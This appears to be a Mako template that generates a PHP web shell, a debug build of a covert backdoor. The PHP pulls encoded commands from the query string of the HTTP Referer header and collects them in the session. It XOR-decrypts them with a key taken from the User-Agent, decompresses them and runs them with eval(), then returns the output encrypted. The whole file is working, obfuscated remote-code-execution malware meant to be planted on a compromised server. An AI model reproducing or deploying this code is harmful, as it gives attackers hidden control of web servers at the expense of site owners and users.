<%! import hashlib %><% 
key = hashlib.md5(password).hexdigest(); 
trigger = key[:3]
terminator = key[3:6] 
%>$k="${trigger}"; 
$e="${terminator}";
<%text>

print("<$k${e}DEBUG>STEP0</$k${e}DEBUG>");

error_reporting(E_ALL);
function x($t,$k) {
	$c=strlen($k);
	$l=strlen($t);
	$o="";
	for($i=0;$i<$l;) {
	     for($j=0;($j<$c&&$i<$l);$j++,$i++)
	     {
	         $o.= $t{$i}^$k{$j};
	     }
	 }  
	 return $o;
}


$u = parse_url($_SERVER["HTTP_REFERER"]);
if(isset($u["query"])) parse_str($u["query"], $q);

print("<$k${e}DEBUG>STEP1</$k${e}DEBUG>");

if ($q) {

	$r = x($_SERVER["HTTP_USER_AGENT"], $k);

	print("<$k${e}DEBUG>STEP2</$k${e}DEBUG>");

	foreach($q as $p) {
	
		$kp = strpos($p,$k);
		$ep = strpos($p,$e);
		
		print("<$k${e}DEBUG>Check in kp=$kp ep=$ep k=$k e=$e </$k${e}DEBUG>");
		
		if (($ep !== false) || ($kp !== false)) {
			@session_start();
			$s=&$_SESSION["s"];
			$s.=preg_replace(array("#$e.*#","#$k#","#_#"),array("","","+"),$p);
			if($ep !== false) {
				
				ob_start();
				eval(gzuncompress(x(base64_decode($s),$r)));
				$o=ob_get_contents();
				ob_end_clean();
				$d=base64_encode(x(gzcompress($o),$r));
				print("<$k$e>$d</$k$e>");
				@session_destroy();
			}
			
		}
	}
}

</%text>
